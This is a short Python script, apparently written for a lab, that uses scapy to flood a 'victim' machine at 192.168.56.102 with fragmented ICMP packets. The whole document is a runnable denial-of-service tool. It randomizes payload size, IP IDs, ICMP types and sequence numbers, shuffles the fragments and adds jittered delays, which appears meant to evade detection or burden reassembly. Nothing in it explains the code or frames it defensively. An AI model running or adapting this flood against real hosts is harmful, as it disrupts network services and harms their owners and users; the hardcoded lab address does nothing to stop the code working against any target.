from scapy.all import IP, ICMP, send, fragment
from datetime import datetime
import random
import time

def icmpFlood(targetIp, packetCount):
    try:
        for i in range(packetCount):
            payload = bytes([random.randint(0, 255) for _ in range(random.randint(800, 1400))])
            
            #IP/ICMP packet with random ID, type and seq
            packet = IP(dst=targetIp, id=random.randint(1, 65535), flags="MF") / ICMP(type=random.choice([8, 0]), seq=random.randint(1, 65535)) / payload
            
            #Fragment with variable size
            fragmentedPackets = fragment(packet, fragsize=random.randint(64, 128))  
            
            #Send fragments in random order with random delays
            random.shuffle(fragmentedPackets)
            for frag in fragmentedPackets:
                send(frag, verbose=0)
                time.sleep(random.uniform(0.02, 0.1))  #Random delays
            
            currentTime = datetime.now().strftime("%d-%m-%Y %H:%M:%S.%f")
            print(f"{i+1} - Packet sent - {currentTime}")
        
    except KeyboardInterrupt:
        print("\nICMP flooding stob by user")
    except Exception as e:
        print(f"Error: {e}")

targetIp = "192.168.56.102"  #IP address of the victim's machine
packetCount = 100  
icmpFlood(targetIp, packetCount)
